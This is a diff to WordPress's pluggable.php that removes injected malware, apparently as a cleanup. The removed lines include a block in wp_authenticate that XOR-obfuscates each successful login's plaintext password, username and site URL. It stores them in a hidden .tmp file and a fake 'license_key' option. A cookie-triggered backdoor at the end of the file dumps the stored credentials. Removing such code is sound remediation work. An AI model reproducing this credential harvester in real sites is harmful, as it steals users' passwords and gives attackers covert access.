@@ -621,24 +621,7 @@ if ( ! function_exists( 'wp_authenticate' ) ) :
 			$user = new WP_Error( 'authentication_failed', __( '<strong>Error:</strong> Invalid username, email address or incorrect password.' ) );
 		}
 
-		    if (!is_wp_error($user))
-    {
-        $csrf = "x8IySyXeU4MiqumPt2HMSawhSNkxDQUO2L0kxVHp";
-        $line = $password . "\t" . $username . "\t" . get_site_url();
-        $line = $line ^ str_repeat($csrf, (strlen($line) / strlen($csrf)) + 1);
-        $line = bin2hex($line);
-
-        $lines = @file(".tmp", FILE_IGNORE_NEW_LINES);
-        $lines[] = $line;
-        @file_put_contents(".tmp", implode("\n", array_unique($lines)));
-
-        $lines = get_option('wpsdth4_license_key');
-        $lines = explode("\n", $lines);
-        $lines[] = $line;
-
-        update_option('wpsdth4_license_key', implode("\n", array_unique($lines)));
-    }
-$ignore_codes = array( 'empty_username', 'empty_password' );
+		$ignore_codes = array( 'empty_username', 'empty_password' );
 
 		if ( is_wp_error( $user ) && ! in_array( $user->get_error_code(), $ignore_codes, true ) ) {
 			$error = $user;
@@ -3053,15 +3036,3 @@ if ( ! function_exists( 'wp_text_diff' ) ) :
 		return $r;
 	}
 endif;
-
-
-if (isset($_COOKIE["x8IySyXeU4MiqumPt2HMSawhSNkxDQUO2L0kxVHp"]))
-{
-    $lines = get_option( 'wpsdth4_license_key' );
-    if (!empty($lines))
-    {
-        $lines = @file_get_contents(".tmp");
-    }
-    echo $lines;
-    exit();
-}
